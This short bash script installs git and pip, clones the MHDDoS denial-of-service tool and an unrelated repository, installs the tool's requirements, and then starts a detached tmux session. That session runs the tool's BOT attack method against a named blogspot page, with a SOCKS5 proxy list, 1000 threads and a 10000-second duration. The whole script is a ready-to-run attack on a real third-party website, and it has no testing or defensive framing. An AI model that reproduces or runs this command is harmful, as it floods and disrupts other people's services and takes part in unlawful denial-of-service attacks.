#!/bin/bash
apt install git -y
apt install pip -y
git clone https://github.com/ebesinitadw/new
git clone https://github.com/MHProDev/MHDDoS.git 
cd MHDDoS 
pip3 install -r requirements.txt
sudo tmux new -d "sudo tmux new -d python3 start.py BOT https://techmoonaze.blogspot.com/2022/10/reverse-shell-ndir-nec-edilir.html?m=1 5 1000 socks5.txt 100 10000"